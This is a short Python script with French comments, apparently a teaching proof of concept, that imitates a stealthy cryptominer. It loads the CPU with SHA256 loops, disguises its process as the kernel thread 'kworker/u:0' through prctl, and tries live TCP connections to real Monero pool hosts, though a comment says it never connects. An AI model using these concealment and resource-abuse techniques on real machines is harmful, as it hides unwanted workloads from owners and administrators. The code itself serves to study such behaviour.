#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dossier: Ware - Étape 09: Cryptominer (PoC Éducatif)
Intention: Al-Khabir (Comprendre l'abus de ressources pour y remédier)
Description: Simule un cryptominer silencieux :
             - Charge CPU intensive (boucle de hachage SHA256)
             - Connexion simulée vers un pool minier connu
             - Se cache sous un nom de processus générique
Conformité: Flake8 / 88 caractères maximum.
"""

import hashlib
import socket
import sys
import threading
import time

# Pools miniers connus (pour simulation réseau uniquement — jamais connecté)
MINING_POOLS = [
    ("pool.supportxmr.com", 3333),
    ("xmr.pool.minergate.com", 4444),
    ("xmrpool.eu", 14444),
]

STOP_EVENT = threading.Event()


def mining_loop(thread_id, iterations=500_000):
    """
    Simule le travail de hachage d'un mineur.
    Boucle intensive en SHA256 pour charger le CPU.
    """
    nonce = 0
    template = f"block-{thread_id}-"
    print(f"[Miner-{thread_id}] Démarrage du hachage...")
    start = time.time()
    for _ in range(iterations):
        if STOP_EVENT.is_set():
            break
        data = f"{template}{nonce}".encode()
        hashlib.sha256(data).hexdigest()
        nonce += 1
    elapsed = time.time() - start
    rate = int(iterations / elapsed) if elapsed > 0 else 0
    print(f"[Miner-{thread_id}] Terminé : {rate} H/s en {elapsed:.1f}s")


def simulate_pool_connection():
    """
    Tente une connexion TCP vers un pool minier simulé.
    Échoue silencieusement si le pool est inaccessible (comportement réel).
    """
    for host, port in MINING_POOLS:
        print(f"[Miner-Net] Tentative de connexion : {host}:{port}...")
        try:
            sock = socket.create_connection((host, port), timeout=3)
            print(f"[Miner-Net] Connecté à {host}:{port} (pool actif !)")
            sock.close()
            return True
        except (OSError, socket.timeout):
            print(f"[Miner-Net] {host}:{port} inaccessible (normal en PoC).")
    return False


def run_miner(cpu_threads=2, duration=30):
    """
    Lance le miner avec N threads CPU pendant `duration` secondes.
    Simule la furtivité en renommant le processus si possible.
    """
    # Simulation du nom de processus générique (furtivité)
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, b"kworker/u:0", 0, 0, 0)
        print("[Miner] Nom de processus masqué en 'kworker/u:0'")
    except Exception:
        pass

    simulate_pool_connection()

    threads = []
    for i in range(cpu_threads):
        t = threading.Thread(target=mining_loop, args=(i,), daemon=True)
        t.start()
        threads.append(t)

    print(f"[Miner] {cpu_threads} thread(s) actif(s). Durée : {duration}s")
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        STOP_EVENT.set()
        for t in threads:
            t.join(timeout=2)
        print("[Miner] Arrêt.")


if __name__ == "__main__":
    threads = int(sys.argv[1]) if len(sys.argv) > 1 else 2
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    run_miner(cpu_threads=threads, duration=duration)
